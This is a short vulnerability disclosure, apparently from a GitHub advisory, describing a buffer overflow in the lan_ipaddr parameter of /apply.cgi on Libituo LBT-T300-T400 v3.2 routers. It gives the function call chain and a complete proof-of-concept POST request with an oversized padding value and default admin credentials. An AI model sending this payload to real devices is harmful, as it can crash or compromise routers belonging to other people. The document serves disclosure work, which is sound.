# LBT-T300-T400 Buffer Overflow
**Vulnerability description**
Shenzhen Libituo Technology Co., Ltd LBT-T300-T400 v3.2 was discovered to contain a buffer overflow via multiple  parameters at /apply.cgi.

## 1.lan_ipaddr 

### Vulnerability analysis
Due to the lack of data length restrictions of the lan_ipaddr parameter, a buffer overflow vulnerability is created.

function call chain
Main()->sub_40B6F0()->start_single_service()->start_lan().
![original_1730726039425_91fdc68216966f8db45fdfd6139baaed](https://github.com/user-attachments/assets/59877560-fa0f-4a76-b4c9-b5c65c4e626e)

> Payload

```html
POST /apply.cgi HTTP/1.1
Host: 192.168.10.1
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
Origin: http://192.168.10.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.1/LAN_DHCPS_AP.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

submit_button=LAN_DHCPS_AP&change_action=&action=Apply&lan_ipaddr=192.168.10.0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&LAN_DHCPS_AP=NONE&dhcp_server_enable=1&lan_netmask=255.255.255.0&dhcp_start=192.168.10.1&dhcp_end=192.168.10.115&dhcp_lease=999

```
